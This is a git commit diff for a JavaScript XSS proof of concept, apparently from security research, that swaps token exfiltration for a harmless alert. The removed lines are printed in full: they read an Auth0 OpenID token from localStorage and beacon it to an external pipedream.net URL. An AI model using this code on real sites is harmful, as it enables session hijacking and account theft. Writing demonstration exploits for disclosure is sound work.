e75433db1ec0aec31dbd304a4ff72129bae241bf
Habibullah Ahmadi <habahmadi05@outlook.com>
2026-06-09 14:43:37 +0100

    harmless poc

--- poc.js
+++ poc.js
@@ -1,15 +1,9 @@
 System.register([], function () {
   return { execute: function () {
-    try {
-      var k = Object.keys(localStorage).find(function (x) {
-        return /auth0/i.test(x) && /openid/i.test(x);
-      });
-      var tok = k ? localStorage.getItem(k) : "(no auth0 token found)";
-      new Image().src = "https://eondm3hfjar18nj.m.pipedream.net/?o=" +
-        encodeURIComponent(location.origin) + "&d=" + encodeURIComponent(tok);
-    } catch (e) {
-      new Image().src = "https://eondm3hfjar18nj.m.pipedream.net/?err=" +
-        encodeURIComponent(String(e));
-    }
+    var k = Object.keys(localStorage).find(function (x) {
+      return /auth0/i.test(x) && /openid/i.test(x);
+    });
+    alert("XSS executing in origin: " + location.origin +
+          "\nReachable Auth0 token key: " + (k || "none"));
   }};
 });
